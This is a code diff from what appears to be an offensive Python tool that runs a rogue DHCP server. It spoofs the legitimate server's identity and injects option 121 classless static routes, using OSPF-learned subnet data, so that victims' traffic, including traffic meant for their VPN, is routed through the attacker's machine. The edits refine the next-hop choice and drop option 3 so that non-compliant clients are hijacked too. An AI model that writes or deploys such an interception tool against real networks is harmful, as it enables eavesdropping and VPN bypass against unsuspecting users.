@@ -313,42 +313,44 @@ def sniff_dhcpoffer(interface, timeout=10):
     return offer
 
 
-def build_server_details_from_ospf(interface, ospf_params, our_ip, offer=None, dns=None):
+def build_server_details_from_ospf(interface, ospf_params, source_ip,
+                                   relay_ip=None, offer=None, dns=None):
     """Build the server_details dict consumed by the rogue DHCP server.
 
     ospf_params   — learned from sniff_ospf_hellos (gives subnet + gateway).
-    our_ip        — our chosen interface IP (from pick_client_ip).
-    offer         — optional DHCPOFFER dict from sniff_dhcpoffer; if provided,
-                    populates real_server_ip and dns from the legitimate server.
+    source_ip     — IP used as DHCP server_id (option 54) in responses; set to
+                    the real DHCP server IP for impersonation.
+    relay_ip      — our actual interface IP, used as the option 121 next-hop so
+                    the victim ARPs our MAC.  MUST be different from source_ip
+                    when source_ip is a loopback alias — the loopback has no
+                    ARP presence on the LAN so the victim can't reach it.
+                    Defaults to source_ip when not supplied.
+    offer         — optional DHCPOFFER dict from sniff_dhcpoffer; populates dns.
     dns           — manual DNS override (takes precedence over offer).
-
-    The rogue server will advertise our_ip as its server_id.  When a client
-    sends a REQUEST to the real server (option 54 != our_ip), the
-    IMPERSONATE_REAL_SERVER path in ack_request() forges an ACK spoofing the
-    real server's identity, learned directly from the client's REQUEST packet.
     """
     netmask = ospf_params["netmask"]
     gateway = ospf_params["src_ip"]  # SVI IP = default gateway for this subnet
     network = ipaddress.IPv4Network(f"{gateway}/{netmask}", strict=False)
-
     resolved_dns = dns or (get_first_ipv4_address(offer.get("dns")) if offer else None)
+    arp_nexthop = relay_ip or source_ip
 
     print_step(
         "OK",
-        f"DHCP server details: our_ip={our_ip} gateway={gateway} "
-        f"network={network} dns={resolved_dns or 'unknown'}",
+        f"DHCP server details: server_id={source_ip} relay_ip={arp_nexthop} "
+        f"gateway={gateway} network={network} dns={resolved_dns or 'unknown'}",
     )
     return {
-        "interface": interface,
-        "source_ip": our_ip,
-        "gateway": gateway,
-        "netmask": netmask,
-        "dns": resolved_dns,
-        "network": network,
+        "interface":   interface,
+        "source_ip":   source_ip,    # DHCP server_id / option 54 (impersonation)
+        "relay_ip":    arp_nexthop,  # option 121 next-hop (must ARP on victim's LAN)
+        "gateway":     gateway,
+        "netmask":     netmask,
+        "dns":         resolved_dns,
+        "network":     network,
         "vlan_details": {},
-        "relay_only": False,
+        "relay_only":  False,
         "answered_request_xids": set(),
-        "opt121_subnets": list(HIJACK_ROUTE_PREFIXES),
+        "opt121_subnets":           list(HIJACK_ROUTE_PREFIXES),
         "opt121_default_via_router": False,
     }
 
@@ -818,6 +820,45 @@ def build_dhcp_response(packet, message_type, offered_ip, dhcp_network, server_i
     dst_ip = giaddr if is_relayed or broadcast_requested else offered_ip
     dst_port = 67 if is_relayed else 68
 
+    # Build option 121 first so we know whether to suppress option 3.
+    #
+    # relay_ip (our actual interface IP) is the ARP-resolvable next-hop for
+    # option 121 routes.  It MUST be our physical interface IP, NOT source_ip
+    # (which may be a loopback alias for the real DHCP server — the loopback has
+    # no ARP presence on the LAN, so victims can't forward traffic to it).
+    #
+    # Per RFC 3442: when option 121 is present, RFC-compliant clients MUST ignore
+    # option 3.  However many real implementations (dhclient, Windows) install
+    # BOTH — and then the VPN's /1 push-routes override everything.  Omitting
+    # option 3 entirely when option 121 covers the default forces correct behaviour
+    # on non-compliant clients, matching what 121.py does.
+    opt121_routes = []
+    if server_details is not None:
+        # RFC 3442 §3: the next-hop for each classless static route MUST be
+        # on the same subnet as the client's interface.
+        # Direct client (giaddr=0.0.0.0): our source_ip IS in their subnet ✓
+        # Relayed client (giaddr!=0.0.0.0): source_ip is a different subnet;
+        #   use giaddr (the relay agent's client-facing IP) which IS on-link.
+        #   OSPF stub injection for opt121_subnets makes the relay agent route
+        #   that traffic back to us.
+        if is_relayed and giaddr and giaddr != "0.0.0.0":
+            # Relayed client: giaddr is the relay agent's client-facing IP — on-link.
+            opt121_nexthop = giaddr
+        else:
+            # Direct client: use relay_ip (our LAN interface IP, ARP-resolvable).
+            # source_ip may be a loopback alias with no ARP presence on the LAN.
+            opt121_nexthop = server_details.get("relay_ip") or server_details.get("source_ip", server_ip)
+        for subnet in server_details.get("opt121_subnets", []):
+            opt121_routes.append((subnet, opt121_nexthop))
+        if server_details.get("opt121_default_via_router") and router:
+            opt121_routes.append(("0.0.0.0/0", router))
+
+    # option 121 has a default route if any entry is /0 or 0.0.0.0/0
+    opt121_has_default = any(
+        str(cidr).startswith("0.0.0.0/0") or cidr == "0.0.0.0/0"
+        for cidr, _ in opt121_routes
+    )
+
     dhcp_options = [
         ("message-type", message_type),
         ("server_id", server_ip),
@@ -830,26 +871,11 @@ def build_dhcp_response(packet, message_type, offered_ip, dhcp_network, server_i
         if dns:
             dhcp_options.append(("name_server", dns))
 
-    if router:
+    # Omit option 3 when option 121 already covers the default route — prevents
+    # non-RFC-compliant clients from installing both and having the VPN override.
+    if router and not opt121_has_default:
         dhcp_options.append(("router", router))
 
-    # Option 121: classless static routes that override the default gateway on
-    # RFC 3442-compliant clients (more-specific routes win, beating a VPN's /1
-    # split-tunnel pair).  The route set is driven entirely by server_details so
-    # the same builder serves both the full hijack and the selective VPN relay:
-    #   opt121_subnets            -> each CIDR routed via our identity (source_ip)
-    #   opt121_default_via_router -> also push 0.0.0.0/0 via this VLAN's router
-    #                                (passthrough for non-relayed traffic)
-    # The VPN/hijack next-hop is always source_ip (our loopback identity), even
-    # when server_ip is spoofed during impersonation, so victim packets still
-    # land on our physical interface.
-    opt121_routes = []
-    if server_details is not None:
-        our_ip = server_details.get("source_ip", server_ip)
-        for subnet in server_details.get("opt121_subnets", []):
-            opt121_routes.append((subnet, our_ip))
-        if server_details.get("opt121_default_via_router") and router:
-            opt121_routes.append(("0.0.0.0/0", router))
     if opt121_routes:
         dhcp_options.append((121, build_opt121(opt121_routes)))
 
